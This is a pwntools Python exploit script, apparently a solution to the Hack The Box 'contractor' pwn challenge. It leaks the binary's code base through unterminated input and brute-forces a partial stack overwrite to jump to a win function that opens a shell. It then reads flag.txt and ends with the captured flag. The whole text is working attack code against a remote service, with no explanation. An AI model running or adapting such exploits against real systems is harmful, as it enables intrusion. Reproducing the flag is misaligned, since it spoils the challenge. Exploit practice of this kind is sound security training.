from pwn import *

e = ELF("./contractor_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = e

'''
leave
'''

script = '''
b *main
b *main + 1665
'''

#for i in range(1):
while(True):
	try:
		p = remote("94.237.59.98", 57227)
		#p = process("./contractor_patched")
		#p = gdb.debug("./contractor_patched", gdbscript = script)

		p.sendafter(b"name?", b"A" * (0xF + 1))
		p.sendafter(b"me?", b"B" * (0xFF + 1))
		p.sendlineafter(b"again?", b"-1")
		p.sendafter(b"combat?", b"C" * (0xF + 1))
		p.recvuntil(b"C" * (0xF + 1))
		code_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1b50
		print(hex(code_base))

		p.sendlineafter(b"4. Specialty\n\n> ", b"4")
		payload = b"D" * 0x18 + p64(0) + p8(0x60)
		p.sendlineafter(b"good at: ", payload)
		p.sendafter(b"now?\n\n> ", b"X" * 4)

		#gdb.attach(p, gdbscript = script)

		win = code_base + e.symbols['contract']
		p.sendlineafter(b"4. Specialty\n\n> ", b"4")
		p.sendlineafter(b"good at: ", p64(win))

		p.sendline(b"echo vanishing")
		p.recvuntil(b"vanishing")
		break
	except:
		try:
			p.close()
		except:
			pass

p.sendline(b"cat flag.txt")

p.interactive()
#HTB{4_l1ttl3_bf_41nt_b4d_4d8370cd804acb8751c13f1b5abaf55b}